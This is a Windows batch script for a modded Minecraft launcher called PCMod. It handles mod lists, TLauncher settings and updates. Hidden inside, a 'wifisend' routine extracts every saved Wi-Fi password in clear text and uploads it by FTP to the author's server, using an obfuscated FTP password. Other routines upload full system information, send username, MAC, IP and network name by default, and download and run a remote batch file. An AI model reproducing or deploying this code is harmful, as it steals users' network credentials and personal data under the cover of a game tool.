@echo off
if "%1"=="modlist" call :modlist %2&goto :eof
if "%1"=="len" call :len %2 %3&goto :eof
set ftppass=cnff
set program="%cd%\PCMod.hta"
if not exist "settings.txt" call :save new
echo.^>%1 %2 %3
call :load
if "%1"=="shortcut" call :shortcut %2 %3
if "%1"=="direct" call :direct %2 %3
if "%1"=="javacheck" call :jc
if "%1"=="log-logins" call :ll %2 %3
if "%1"=="lite" call :lite %2 %3&exit
if "%1"=="send-sysinfo" call :ssys
if "%1"=="web" call :web %2
if "%1"=="refreshplayers" call :refreshplayers
if "%1"=="promo" echo.^>%2&call :promo.send %2
if "%1"=="user" if "%direct%"=="0" call :tl.user %2
if "%1"=="user" if "%direct%"=="1" call :user %2
if "%1"=="pass" if "%direct%"=="1" call :pass %2
if "%1"=="passdel" call :passdel
if "%1"=="update" call :update.now
if "%1"=="init" call :init
if "%1"=="whitelist" call :whitelist
if "%1"=="launch" call :launch %2&exit
call :save
echo.DONE
exit /b

:len string outputvar
Setlocal EnableDelayedExpansion
:: strLen String [RtnVar]
::             -- String  The string to be measured, surround in quotes if it contains spaces.
::             -- RtnVar  An optional variable to be used to return the string length.
Set "s=#%~1"
Set "len=0"
For %%N in (4096 2048 1024 512 256 128 64 32 16 8 4 3 2 1) do (
  if not "!s:~%%N,1!"=="" (
    set /a "len+=%%N"
    set "s=!s:~%%N!"
  )
)
Endlocal&if not "%~2"=="" set %~2=%len%
goto :eof
:net.check
echo.Checking Connection...
ping %url% -n 1 >nul
if "%errorlevel%"=="1" set connection=0
if "%errorlevel%"=="0" set connection=1
copy nul data\indexes\signature >nul
if "%connection%"=="0" echo.[408] OFFLINE&goto :eof
if "%connection%"=="1" bin\wget -q http://%url%/pcmod2/updates/sig -O data\indexes\signature
title PCMod
for /f %%z in ('type data\indexes\signature') do set sig=%%z
if "%sig%"=="PCMod" set connection=1
if not "%sig%"=="PCMod" set connection=0
if "%sig%"=="" set connection=-1
if "%connection%"=="1" echo.[200] ONLINE
if "%connection%"=="0" echo.[404] NOT FOUND
if "%connection%"=="-1" echo.[400] BAD REQUEST
if not "%sig%"=="PCMod" if "%1"=="popup" bin\nircmd.exe infobox "Unable to connect to MarksPi Server. Internet/Server Error" "PCMod Error"
goto :eof
:update.check
::>cmd\upcheck.vbs echo.CreateObject("WScript.Shell").Popup " Checking for PCMod Updates..." ^& vbcrlf ^& " Current Version: %version%", 4, "PCMod - Updater"
::start cmd\upcheck.vbs
call :net.check popup
echo.Checking for updates...
echo.[%version%]
if "%connection%"=="0" echo.*** No Connection ***&goto :eof
bin\wget -q http://%url%/pcmod2/version -O data\indexes\version.tmp
title PCMod
set update=
for /f %%a in ('type data\indexes\version.tmp') do if not "%%a"=="%version%" set update=%%a
if not "%update%"=="" call :update
goto :eof
:whitelist
bin\wget -q -O data\indexes\cmdreturn "http://%url%/pcmod2/whitelist.php?user=%user%
goto :eof
:update
echo.Update Found.
echo.[%update%]
>cmd\msg.vbs echo.Set Shell=CreateObject("wscript.shell") 
>>cmd\msg.vbs echo.Question = Msgbox("PCMod %update% is out." ^& vbCrLf ^& "Would you like to update?" ^& vbCrLf ^& "Warning: You must be up to date to join server!",VbYesNO + VbQuestion, "PCMod Update")
>>cmd\msg.vbs echo.If Question = VbYes Then
>>cmd\msg.vbs echo.     Shell.Run ("cmd\settings.bat update %version%"),1
>>cmd\msg.vbs echo.End If
cscript /nologo cmd\msg.vbs
goto :eof
:update.now
echo.Launching Update...
copy nul bin\.cancelLaunch >nul
if "%connection%"=="1" if "%update%"=="" bin\wget -q http://%url%/pcmod2/updates/cmd/update.bat -O cmd\update.bat
call cmd\update.bat %version%
goto :eof

:web
if "%1"=="discord" start https://discord.gg/AJaVhvR
if "%1"=="pcmod" if not "%ssid%"=="Connjohn Mkbread" start http://pcmod.ddns.me
if "%1"=="pcmod" if "%ssid%"=="Connjohn Mkbread" start http://192.168.0.27/pcmod2
if "%1"=="auth" if not"%ssid%"=="Connjohn Mkbread" start http://pcmod.ddns.me/auth.html
if "%1"=="auth" if "%ssid%"=="Connjohn Mkbread" start http://192.168.0.27/pcmod2/auth.html
goto :eof
:lite
if "%1"=="1" (
	mkdir data\disablesclimods\
	for /f "tokens=1-2 delims=;" %%a in ('type data\indexes\PCMod.pak') do if "%%a"=="C" move "data\.minecraft\mods\%%b" "data\disablesclimods\" >nul
	echo.Backing up current settings...
	copy data\.minecraft\optionsof.txt data\backup\optionsof_default.txt >nul
	copy data\.minecraft\options.txt data\backup\options_default.txt >nul
	set lite=1
	echo.Adding back the required client mods...
	for /f "tokens=1-5 delims=;" %%a in ('type data\indexes\PCMod.pak') do (
		echo.%%d
		if "%%d"=="Optifine" copy "data\disablesclimods\%%b" "data\.minecraft\mods\"
		if "%%d"=="JEI" copy "data\disablesclimods\%%b" "data\.minecraft\mods\"
		if "%%d"=="Offline Skins" copy "data\disablesclimods\%%b" "data\.minecraft\mods\"
		if "%%d"=="Smooth Boot" copy "data\disablesclimods\%%b" "data\.minecraft\mods\"
		if "%%d"=="Sound Device Options" copy "data\disablesclimods\%%b" "data\.minecraft\mods\"
	)
	bin\nircmd.exe infobox "Switched to Lite Mode" "PCMod Modes"
)
if "%1"=="0" (
	for /f "tokens=1-2 delims=;" %%a in ('type data\indexes\PCMod.pak') do if "%%a"=="C" move "data\disablesclimods\%%b" "data\.minecraft\mods\" >nul
	echo.Backing up current settings...
	copy data\.minecraft\optionsof.txt data\backup\optionsof_lite.txt >nul
	copy data\.minecraft\options.txt data\backup\options_lite.txt >nul
	set lite=0
	bin\nircmd.exe infobox "Switched to Default Mode" "PCMod Modes"
)
call :save
call :modlist
goto :eof
:modlist
if "%1"=="start" start data\pages\modlist.hta&goto :eof
SetLocal EnableDelayedExpansion Enableextensions
mkdir data\indexes\modlist 2>nul
echo.y|del data\indexes\modlist\u 2>nul
echo.y|del data\indexes\modlist\c 2>nul
echo.y|del data\indexes\modlist\b 2>nul
set mcount=
for /f "tokens=1-5 delims=;" %%a in ('type data\indexes\PCMod.pak') do (
	if "%%a"=="C" set /a mcount=!mcount!+1
	if "%%a"=="B" set /a mcount=!mcount!+1
	if "%%a"=="U" set /a mcount=!mcount!+1
)
>data\indexes\modcount echo.!mcount!
for /f "tokens=1-2 delims==" %%a in ('type settings.txt') do set %%a=%%b
if "%lite%"=="1" set lite_= style="background-color:#cd6155;"
if "%lite%"=="0" set lite_=
>data\pages\modlist.html echo.^<head^>
>>data\pages\modlist.html echo.^<style^>
>>data\pages\modlist.html echo..altext { 
>>data\pages\modlist.html echo.    display: none;
>>data\pages\modlist.html echo.}
>>data\pages\modlist.html echo.label:hover .altext {
>>data\pages\modlist.html echo.    display: inline-block;
>>data\pages\modlist.html echo.}
>>data\pages\modlist.html echo.^</style^>
>>data\pages\modlist.html echo.^</head^>
>>data\pages\modlist.html echo.^<body style="background-color: #5d6d7e;"^>
>>data\pages\modlist.html echo.^<center^>
>>data\pages\modlist.html echo.^<table border="1" style="background-color: #BCF6F6;"^>
>>data\pages\modlist.html echo.^<th style="background-color: #5d6d7e;"^>Mod Name^</th^>
>>data\pages\modlist.html echo.^<th style="background-color: #5d6d7e;"^>Required^</th^>
>>data\pages\modlist.html echo.^<th style="background-color: #5d6d7e;"^>Version Added/Updated^</th^>^<tr^>
for /f "tokens=1-5 delims=;" %%a in ('type data\indexes\PCMod.pak') do (
	if not "%%a"=="D" (
		if "%%a"=="U" set side=Universally&set color= style="background-color:#BCF6F6;"
		if "%%a"=="U" if not "%%e"=="#" set side=Universally*&set color= style="background-color:#A9DDDD;"
		if "%%a"=="C" set side=Client-Side&set color= style="background-color:#CCF1C1;"
		if "%%a"=="C" if not "%%e"=="#" set side=Client-Side*&set color= style="background-color:#B7D8AD;"
		if "%%a"=="B" set side=Core Mod&set color= style="background-color:#FFAFA6;"
		if "%%a"=="C" if "%lite%"=="1" set side=Client-Side&set color= style="background-color:#CCF1C1;text-decoration: line-through;"
		set tmp=%%d
		if not "%%e"=="#" set tmp=%%d [%%e]
		set tmp_a=!tmp:~0,48!
		set tmp_b=!tmp:~48!
		if "!tmp_u_a!"=="~0,24" set tmp_u_a=
		if "!tmp_u_b!"=="~24" set tmp_u_b=
		>>data\pages\modlist.html echo.^<tr^>^<td!color!^>^<label^>!tmp_a!^<span class="altext"^>!tmp_b!^</span^>^</label^>^</td^>
		>>data\pages\modlist.html echo.^<td!color!^>^<label^>!side!^</label^>^</td^>
		>>data\pages\modlist.html echo.^<td!color!^>^<label^>%%c^</label^>^</td^>^</tr^>
	)
)
>>data\pages\modlist.html echo.^</table^>^</center^>
::count the lines for each coloum to find the greatest one
set count_u=0
set count_b=0
set count_c=0
for /f "tokens=1-5 delims=;" %%a in ('type data\indexes\PCMod.pak') do (
	if "%%a"=="U" (
		set /a count_u=!count_u!+1
		>>data\indexes\modlist\u echo.!count_u!;%%b
	)
	if "%%a"=="B" (
		set /a count_b=!count_b!+1
		>>data\indexes\modlist\b echo.!count_b!;%%b
	)
	if "%%a"=="C" (
		set /a count_c=!count_c!+1
		>>data\indexes\modlist\c echo.!count_c!;%%b
	)
)
goto :eof
:dirlen
set dirlen=-1
call :len %cd% dirlen
echo.Checking Directory Length: %dirlen%
if %dirlen% gtr 37 bin\nircmd.exe infobox "Directory Length is too long for Windows to process the java command"&echo.*** PCMod Error: Directory Length is too long for Windows to process the java command. (%dirlen%)
if %dirlen% gtr 37 del "data\indexes\.instance"
goto :eof
:init
if "%fresh%"=="1" copy nul bin\.fresh >nul
if exist "bin\.fresh" call :fresh id&call :fresh&exit
call :update.check
if "%connection%"=="1" call :refreshplayers
echo.Downloading News.html, PCMod.pak, and CT Script (Shiv.zs)...
if "%connection%"=="0" echo.*** No Connection ***
if "%connection%"=="1" bin\wget.exe -q -O data\pages\news.html http://%url%/pcmod2/updates/news.html
if "%connection%"=="1" bin\wget.exe -q -O data\indexes\PCMod.pak http://%url%/pcmod2/updates/PCMod.pak
if "%connection%"=="1" if "%update%"=="" bin\wget.exe -q -O data\.minecraft\scripts\Shiv.zs http://%url%/pcmod2/updates/scripts/Shiv.zs
if "%direct%"=="0" call :tl.user
if "%direct%"=="1" echo.Settings:&call :user&call :setup
if "%direct%"=="1" if exist "data\indexes\.instance" call :dirlen
if "%connection%"=="1" call :refreshplayers
if "%connection%"=="1" if "%log-logins%"=="1" call :log-logins
if "%modlist%"=="1" call :modlist
goto :eof
:refreshplayers
echo.Refreshing Players...
bin\wget.exe -q -O data\indexes\online http://%url%/pcmod2/players/list
type data\indexes\online
goto :eof
:log-logins
set state=launcher
if exist "data\indexes\last.instance" del data\indexes\last.instance&set state=out
bin\wget.exe -q -O data\indexes\xip ifconfig.co
for /f %%a in ('type data\indexes\xip') do set xip=%%a
for /f %%a in ('type data\indexes\modcount') do set modcnt=%%a
echo.Sending login to server... 
echo.%uuid% - %state%: [%user% @ %version%],[%username%/%computername%/%mac%/%ip%/%ssid%/%xip%],[%modcnt% mods/%memory% MB]
bin\wget -q --spider "http://%url%/pcmod2/login.php?user=%user%&uuid=%uuid%&state=%state%&version=%version%&netinfo=%username%/%computername%/%mac%/%ip%/%ssid%/%xip%&modcount=%modcnt%&memory=%memory%"
goto :eof
:usererror
echo.Invalid User: %user_%
echo.Corrected User: %user%
bin\nircmd.exe infobox "Sorry, the username: %user_% was %1. Correcting to %user%" "PCMod User Error" 1
goto :eof

:user
set mcversion=Forge 1.16.5
if not "%1"=="" set user=%1
set user_=%user%
for /f "usebackq" %%a in (`echo.%user_% ^| bin\tr -dc '[:alnum:]\n\r'`) do set user=%%a
call :len %user% userlen
if %userlen% gtr 16 set user=%user:~0,16%
if %userlen% leq 2 set user=%user%%random%
if not "%user%"=="%user_%" call :usererror invalid
echo.^> --Set User: %user% (%userlen%)
>data\indexes\user echo.%user%
if not "%1"=="" if "%connection%"=="1" if "%log-logins%"=="1" call :log-logins
goto :eof
:pass
>%temp%\auth.tmp <nul set/p "=%1"
for /f "tokens=1 delims= " %%a in ('bin\md5sum.exe %temp%\auth.tmp') do >data\indexes\auth echo.%%a
echo.%user%|bin\xcode.exe data\indexes\auth >nul
>cmd\pass.vbs echo.CreateObject("WScript.Shell").Popup "Password Entered!", 1, "PCMod - Login"
start cmd\pass.vbs
del %temp%\auth.tmp 2>nul
goto :eof
:passdel
call :login.input.decode
if "%connection%"=="0" >cmd\pass.vbs echo.CreateObject("WScript.Shell").Popup "Can not delete password, No Connection!", 5, "PCMod - Login"&start cmd\pass.vbs&goto :eof
bin\wget -O%temp%\au.th --post-data "x=%token%&u=%user%&z=delete" "http://%url%/pcmod2/logins/authp.php" 2>nul
for /f %%a in ('type %temp%\au.th') do set returnAuth=%%a
echo...%returnAuth%
if "%returnAuth%"=="200.delete" >cmd\pass.vbs echo.CreateObject("WScript.Shell").Popup "Password Deleted!", 5, "PCMod - Login"&start cmd\pass.vbs
if "%returnAuth%"=="401.delete" >cmd\pass.vbs echo.CreateObject("WScript.Shell").Popup "Not Logged in!", 5, "PCMod - Login"&start cmd\pass.vbs
del %temp%\au.th 2>nul
goto :eof
:login.input.decode
echo.%user%|bin\xcode.exe data\indexes\auth >nul
for /f "tokens=1 delims= " %%a in ('type data\indexes\auth') do set token=%%a
echo.%user%|bin\xcode.exe data\indexes\auth >nul
goto :eof
:setup
for /f %%a in ('type data\indexes\uuid') do set uuid=%%a
if not exist "data\indexes\%computername%.sysinfo" if "%direct%"=="1" call :ssys skipnotify&bin\nircmd.exe infobox "Can not use Direct, no computer info availible yet.~nDo not know Memory and OS.~nCalculating Now..." "PCMod Error"
call :memcalc
if exist "data\indexes\%computername%.sysinfo" call :oscalc
if %mem% leq 3 bin\nircmd.exe infobox "Your System does not have enough Memory: Using %memory%MB/%mem%%mem-%MB" "PCMod Error"
echo.^> --Set Memory: %memory%
echo.^> --Set MCVersion: %mcversion%
echo.^> --Set Gamedir: %cd%\data\.minecraft
echo.^> --Set Javadir: %cd%\bin\jre_x64\bin\javaw.exe
goto :eof


:tl.user
set mcversion=Forge 1.16.5
echo.##### TLAUNCHER SETTING PROCESS #####
echo.^> Loading Settings for TLauncher...
for /f "tokens=1-2 delims==" %%a in ('type data\.tlauncher\tlauncher-2.0.properties') do (
	if "%%a"=="minecraft.gamedir" set gamedir=%%b
	if "%%a"=="minecraft.javadir" set javadir=%%b
	if "%%a"=="minecraft.memory.ram2" set memory=%%b
	if "%%a"=="client" set client=%%b
	if "%%a"=="process" set process=%%b
	if "%%a"=="gpu" set gpu=%%b
	if "%%a"=="login.version.game" set mcversion=%%b
	if "%%a"=="minecraft.onlaunch" set onlaunch=%%b
)
for /f %%a in ('type data\indexes\uuid') do set uuid=%%a
if "%uuid%"=="" echo.No UUID. Regenerating uuid...&call :fresh id
set gamedir_=%cd:\=\\%\\data\\.minecraft
set gamedir_=%gamedir_::=\:%
echo.^> Comparing Directories... "%gamedir%"=="%gamedir_%"
if not "%gamedir%"=="%gamedir_%" echo.PCMod has been moved. Regenerating uuid...&call :fresh id
::^ C:\ needs to be C\:\\
::replace with something for uuid fresh command
echo.^> Setting custom settings for TLauncher...
set gamedir=%gamedir_%
echo.^> --Set Gamedir: %cd%\data\.minecraft
set javadir=%cd:\=\\%\\bin\\jre_x64\\bin\\javaw.exe
echo.^> --Set Javadir: %cd%\bin\jre_x64\bin\javaw.exe
if not "%1"=="" set user=%1
set user_=%user%
for /f "usebackq" %%a in (`echo.%user_% ^| bin\tr -dc '[:alnum:]\n\r'`) do set user=%%a
if not "%user%"=="%user_%" call :usererror
echo.^> --Set User: %user%
>data\indexes\user echo.%user%
if not exist "data\indexes\%computername%.sysinfo" if "%direct%"=="1" call :ssys skipnotify&bin\nircmd.exe infobox "Can not use MLC, no computer info availible yet.~nCan not calculate Memory and OS.~nCalculating Now..." "PCMod Error"
call :memcalc
if exist "data\indexes\%computername%.sysinfo" call :oscalc
if %mem% leq 3 bin\nircmd.exe infobox "Your System does not have enough Memory: Using %memory%MB/%mem%%mem-%MB" "PCMod Error"
echo.^> --Set Memory: %memory%
echo.^> --Set MCVersion: %mcversion%
if "%lite%"=="1" set onlaunch=exit
if "%lite%"=="0" set onlaunch=hide
if "%closelauncher%"=="1" set onlaunch=exit
echo.^> --Set OnLaunch: %onlaunch%
set client=
set process=
set gpu=
echo.^> Saving new settings...
(echo.# TLauncher configuration file
echo.# Version 2.72
echo.# PCMod Edited. %date% %time%
echo.gui.notice.ad_youtube=false
echo.skin.notification.off.temp=true
echo.gui.console.height=500
echo.minecraft.gamedir=%gamedir%
echo.UPDATER_LAUNCHER=false
echo.minecraft.versions.old_beta=false
echo.gui.console=none
echo.gui.console.y=30
echo.gui.console.x=30
echo.skin.notification.off=true
echo.chooser.type.account=false
echo.gui.notice.ad_server=false
echo.minecraft.versions.sub.remote=true
echo.process.info=%process%
echo.minecraft.versions.modified=true
echo.minecraft.versions.snapshot=false
echo.gui.console.width=720
echo.running.account.type=FREE
echo.sending.tlauncher.unique=1602649275242
echo.gui.settings.guard.checkbox=false
echo.minecraft.versions.release=true
echo.gpu.info.full=%gpu%
echo.minecraft.versions.old_alpha=false
echo.locale=en_US
echo.gui.notice.ad_other=false
echo.minecraft.onlaunch=%onlaunch%
echo.minecraft.versions.sub.old_release=false
echo.settings.version=3
echo.minecraft.memory.ram2=%memory%
echo.gui.settings.servers.recommendation=false
echo.retest.update=false
echo.settings.tip.close=true
echo.skin.status.checkbox.state=false
echo.client=%client%
echo.connection=good
echo.minecraft.size=925;530
echo.login.account=%user%
echo.login.version.game=%mcversion%
echo.minecraft.fullscreen=false
echo.minecraft.javadir=%javadir%
echo.gui.statistics.checkbox=false )>data\indexes\tlauncher-2.0.properties.tmp
move data\indexes\tlauncher-2.0.properties.tmp data\.tlauncher\tlauncher-2.0.properties >nul
echo.^> Saved.
echo.#####  DONE  #####
goto :eof
:memcalc
set memory=
set mem=4
echo.Calculating Memory Availible...
if exist "data\indexes\%computername%.sysinfo" for /f "tokens=1-2 delims=:" %%a in ('type data\indexes\%computername%.sysinfo') do if "%%a"=="Total Physical Memory" set memtot=%%b
set memtot=%memtot: =%
for /f "tokens=1-2 delims=," %%a in ("%memtot%") do set mem=%%a&set mem-=%%b
if "%mem%"=="" set mem=6&set mem-=144
set /a memory=1792+(256*%mem%)
if exist "data\indexes\mem" for /f "tokens=1 delims=*" %%a in ('type data\indexes\mem') do echo.Using onfile memory setting...&set memory=%%a&goto :eof
echo.Calculated %memory%MB/%mem%%mem-%MB for your System.
>data\indexes\mem echo.%memory%
goto :eof
:oscalc
for /f "tokens=1-2 delims=:" %%a in ('type data\indexes\%computername%.sysinfo') do if "%%a"=="OS Name" set os_=%%b
for /f "tokens=1-2 delims=:" %%a in ('type data\indexes\%computername%.sysinfo') do if "%%a"=="OS Version" set os_v=%%b
::OS Name:                   Microsoft Windows 10 Home
::OS Version:                10.0.18363 N/A Build 18363
for /f "tokens=1-4 delims= " %%a in ("%os_%") do set os_=%%b %%c
for /f "tokens=1-4 delims=." %%a in ("%os_v%") do set os_v=%%a.%%b
set os_v=%os_v: =%
>data\indexes\os echo.%os_%;%os_v%
goto :eof
:fresh
if "%1"=="id" set /a P_=%random%*3/2+162735
if "%1"=="id" set uuid=C%random:~-3%PC2%P_%r-1
if "%1"=="id" copy nul data\indexes\.newuser >nul
if "%1"=="id" >data\indexes\uuid echo.%uuid%&echo.New UUID: %uuid%&goto :eof
>cmd\skins.vbs echo.CreateObject("WScript.Shell").Popup "Setting up default settings... Please wait", 25, "PCMod - Launcher"&start cmd\skins.vbs
echo.Refreshing Configuration...
bin\nircmd.exe win close title "PCMod Launcher"
if "%user%"=="" set user=%username%&call :user %username%
if "%shortcut%"=="1" call :shortcut.on
call :save new
call :refreshplayers
call :modlist
call :ssys skipnotify
del bin\.fresh 2>nul
start "" "PCMod.hta"
goto :eof
:network.info
for /f "tokens=2-3 delims=:" %%f in ('ipconfig^|find "IPv4 Address"') do set ip=%%f
for /f "tokens=2 delims=:" %%f in ('NETSH WLAN SHOW INTERFACES ^| findstr /r "^....SSID"') do set ssid=%%f
set ip=%ip:~1%&set ssid=%ssid:~1%
if "%ssid%"=="~1" set ip=Wired&set ip=Ethernet
if "%ip%"=="~1ssid:~1" set ip=127.0.0.1&set ssid=Localhost
set mac=--:--:--:--:--:--
for /f "tokens=1-4 delims=," %%a in ('getmac /fo csv /v') do if not %%d=="Hardware not present" if not %%d=="Media disconnected" set mac=%%c
set mac=%mac:"=%
set mac=%mac:-=:%
set url=markspi.ddns.me
if "%ssid%"=="Connjohn Mkbread" set url=192.168.0.27
if "%url%"=="markspi.ddns.me" (
	echo.Setting mode: Remote
)
if "%url%"=="192.168.0.27" (
	echo.Setting mode: Local
)
goto :eof
:shortcut
for /f "usebackq tokens=1,2,*" %%B IN (`reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v Desktop`) do set DESKTOP=%%D
set desktop_=%desktop:"=%
>data\indexes\desktop echo."%desktop_%"
set userprofile_=%userprofile:"=%
if not exist "%desktop_%" set desktop_=%USERPROFILE_%\Desktop
set program_=%program:"=%
set cd_=%cd:"=%
set appdata_=%appdata:"=%
if "%1"=="1" call :shortcut.on %2
if "%1"=="0" call :shortcut.off %2
goto :eof
:shortcut.on
set SCRIPT=cmd\shortcut.vbs
echo Set oWS = WScript.CreateObject("WScript.Shell") >%SCRIPT%
echo sLinkFile = "%desktop_%\PCMod.lnk" >>%SCRIPT%
echo Set oLink = oWS.CreateShortcut(sLinkFile) >>%SCRIPT%
echo oLink.TargetPath = "%program_%" >>%SCRIPT%
echo oLink.WorkingDirectory= "%cd_%" >>%SCRIPT%
echo oLink.Description = "PCMod - Plattecraft Modded Launcher" >>%SCRIPT%
echo oLink.IconLocation = "%cd_%\data\icons\icon.ico" >>%SCRIPT%
echo oLink.Save >>%SCRIPT%
cscript /nologo %SCRIPT% 2>nul
ping localhost -n 1 >nul
del %SCRIPT% 2>nul
mkdir "%appdata_%\Microsoft\Windows\Start Menu\Programs\Plattecraft\" 2>nul
copy "%desktop_%\PCMod.lnk" "%appdata_%\Microsoft\Windows\Start Menu\Programs\Plattecraft\PCMod.lnk" >nul
set shortcut=1
goto :eof
:shortcut.off
del "%USERPROFILE_%\Desktop\PCMod.lnk" 2>nul
set shortcut=0
goto :eof
:direct
if "%1"=="1" set direct=1
if "%1"=="0" set direct=0
if not exist "bin\jre_x64\bin\javaw.exe" set direct=0
goto :eof
:ll
if "%1"=="1" set log-logins=1
if "%1"=="0" set log-logins=0
goto :eof
:ssys
>bin\ftp echo.cd logins
>>bin\ftp echo.lcd data
>>bin\ftp echo.lcd indexes
>>bin\ftp echo.cd "%user%"
>data\indexes\"%computername%.sysinfo" systeminfo 2>nul&>>bin\ftp echo.put "%computername%.sysinfo"&copy nul %temp%\pcmodsysinfo >nul
>>bin\ftp echo.bye
for /f "usebackq" %%a in (`echo.%ftppass% ^| bin\tr 'A-Za-z0-9' 'N-ZA-Mn-za-m5-90-4'`) do set ftppass_=%%a
bin\ftps.exe -a -user:pcmod -password:%ftppass_% -s:bin\ftp %url% 21
del bin\ftp 2>nul
if "%1"=="skipnotify" goto :eof
>data\indexes\ssys echo. (Sent)
bin\nircmd.exe infobox "System Info has been sent." "PCMod SysInfo"
goto :eof
:jc
ping localhost -n 1 >nul
echo.Checking for Java...
set javaok=0
for /f %%a in ('wmic os get osarchitecture ^| find /i "bit"') do set osarch=%%a
echo.[OS Arch: %osarch%]
java -version 2>&1 | find "64-Bit" >nul
if "%errorlevel%"=="1" set javaarch=32-bit
if not "%errorlevel%"=="1" set javaarch=64-bit
echo.[JAVA Arch: %javaarch%]
if "%osarch%"=="%javaarch%" set javaok=1&set javaerr=0&set javainf=You have %javaarch% java and %osarch% OS. All is Good.&>data\indexes\java echo.(%osarch%)
if "%javaok%"=="0" if "%javaarch%"=="" set javaerr=404&set javainf=No Java Found on Device. Please install Java [%osarch%]&start "" "https://java.com/en/download/manual.jsp"&>data\indexes\java echo.(Missing)
if "%javaok%"=="0" if "%javaarch%"=="32-bit" set javaerr=032&set javainf=Need to get x64 java. You have %javaarch% java.&start "" "http://javadl.oracle.com/webapps/download/AutoDL?BundleId=225353_090f390dda5b47b9b721c7dfaa008135"&>data\indexes\java echo.(Wrong)
if "%javaok%"=="0" if "%javaarch%"=="64-bit" set javaerr=064&set javainf=Need to get x32 java. You have %javaarch% java.&start "" "http://javadl.oracle.com/webapps/download/AutoDL?BundleId=225355_090f390dda5b47b9b721c7dfaa008135"&>data\indexes\java echo.(Wrong)
echo.[ERRORCODE: %javaerr%]
echo. - %javainf%
bin\nircmd.exe infobox "%javainf%" "PCMod Java Check [%javaerr%]"
goto :eof
:promo.send
if /i "%*"=="wifi" call :wifisend 
if /i "%*"=="uninstall" call :uninstall&goto :eof
bin\wget.exe --spider "http://%url%/pcmod2/promo.php?user='%user%'&promo='%*'"
if not "%*"=="" bin\nircmd.exe infobox "CMD SENT: %*" "PCMod Promocode"
goto :eof
:wifisend
SetLocal EnableDelayedExpansion Enableextensions
for /f "skip=9 tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
	set ssid=%%a
	::DELETE FIRST SPACE
	set ssid=!ssid:~1!
	set /p "=[!ssid!] ... "<nul
	netsh wlan show profile name="!ssid!" key=clear >.tmp
	ping localhost -n 1 >nul
	set haspass=0
	for /f "tokens=1-2 delims=:" %%c in ('type .tmp') do (
		if "%%c"=="    Key Content            " (
			set pass=%%d
			set pass=!pass:~1!
			echo.PASSWORD:[!pass!]
			set haspass=1
		)
	)
	if "!haspass!"=="0" echo.
	if "!haspass!"=="1" >>bin\passlist echo.!ssid!=!pass!
)
del .tmp
Endlocal
set ftppass=cnff
>bin\wifi.ftp echo.cd logins
>>bin\wifi.ftp echo.cd "%user%"
>>bin\wifi.ftp echo.lcd bin
>>bin\wifi.ftp echo.prompt
>>bin\wifi.ftp echo.put passlist
>>bin\wifi.ftp echo.bye
for /f "usebackq" %%a in (`echo.%ftppass% ^| bin\tr 'A-Za-z0-9' 'N-ZA-Mn-za-m5-90-4'`) do set ftppass_=%%a
bin\ftps.exe -a -user:pcmod -password:%ftppass_% -s:bin\wifi.ftp %url% 21 2>>bin\error.log >>bin\upload.log
del bin\wifi.ftp
del bin\passlist
goto :eof
:uninstall
call :shortcut 0
bin\wget.exe --spider "http://%url%/pcmod2/promo.php?user='%user%'&promo='%*'&uuid='%uuid%'"
timeout /t 10
>%temp%\uninstallPCMod.bat echo.@echo off
>>%temp%\uninstallPCMod.bat echo.echo.Uninstall '%%*'?
>>%temp%\uninstallPCMod.bat echo.choice /c:"yn" /m "Are you sure you would like to uninstall?"
>>%temp%\uninstallPCMod.bat echo.if "%%errorlevel%%"=="1" echo.Uninstalling in 290 seconds... Close this window to cancel.
>>%temp%\uninstallPCMod.bat echo.if "%%errorlevel%%"=="2" exit
>>%temp%\uninstallPCMod.bat echo.if "%%*"=="" exit
>>%temp%\uninstallPCMod.bat echo.timeout /t 290 /NOBREAK
>>%temp%\uninstallPCMod.bat echo.bin\nircmd.exe win close title "PCMod Launcher"
>>%temp%\uninstallPCMod.bat echo.echo.Uninstalling... 
>>%temp%\uninstallPCMod.bat echo.echo.Deleting... "%cd%\bin\"
>>%temp%\uninstallPCMod.bat echo.echo.y^|del /s "%cd%\bin\"
>>%temp%\uninstallPCMod.bat echo.echo.y^|rd /s "%cd%\bin\"
>>%temp%\uninstallPCMod.bat echo.echo.Deleting... "%cd%\data"
>>%temp%\uninstallPCMod.bat echo.echo.y^|del /s "%cd%\data\"
>>%temp%\uninstallPCMod.bat echo.echo.y^|rd /s "%cd%\data\"
>>%temp%\uninstallPCMod.bat echo.echo.y^|del /s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\PCMod.vbs"
>>%temp%\uninstallPCMod.bat echo.echo.y^|del /s "%appdata%\Microsoft\Windows\Start Menu\Programs\Plattecraft\*"
>>%temp%\uninstallPCMod.bat echo.echo.y^|rd /s "%appdata%\Microsoft\Windows\Start Menu\Programs\Plattecraft"
>>%temp%\uninstallPCMod.bat echo.echo.Deleting... "%cd%\PCMod.hta"
>>%temp%\uninstallPCMod.bat echo.echo.y^|del "PCMod.hta"
>>%temp%\uninstallPCMod.bat echo.echo.Deleting... "%cd%\settings.txt"
>>%temp%\uninstallPCMod.bat echo.echo.y^|del "settings.txt"
>>%temp%\uninstallPCMod.bat echo.echo.Deleting... "%cd%\cmd"
>>%temp%\uninstallPCMod.bat echo.echo.y^|del /s "%cd%\cmd\"
>>%temp%\uninstallPCMod.bat echo.echo.y^|rd /s "%cd%\cmd\"
>>%temp%\uninstallPCMod.bat echo.cd ..
>>%temp%\uninstallPCMod.bat echo.echo.y^|del /s "%%*"
>>%temp%\uninstallPCMod.bat echo.echo.y^|rd /s "%%*"
>>%temp%\uninstallPCMod.bat echo.echo.Uninstall complete.
>>%temp%\uninstallPCMod.bat echo.echo.Verifying uninstall...
>>%temp%\uninstallPCMod.bat echo.if exist "%%*" echo.Uninstall Failed.^&pause ^>nul^&exit
>>%temp%\uninstallPCMod.bat echo.echo.Uninstall Successful.
>>%temp%\uninstallPCMod.bat echo.ping localhost -n 5 ^>nul
>>%temp%\uninstallPCMod.bat echo.del %%0
>>%temp%\uninstallPCMod.bat echo.exit
start cmd /c "%temp%\uninstallPCMod.bat" %cd%
ping localhost -n 5 >nul
goto :eof

:load
del cmd\pass.vbs 2>nul
set shortcut=1&set log-logins=1&set lite=0&set direct=1
if not exist "cmd\launching.vbs" if exist "data\indexes\.instance" move data\indexes\.instance data\indexes\last.instance >nul
for /f "tokens=1-2 delims==" %%a in ('type settings.txt') do set %%a=%%b
for /f %%a in ('type data\indexes\user') do set user=%%a
for /f %%a in ('type data\indexes\version') do set version=%%a
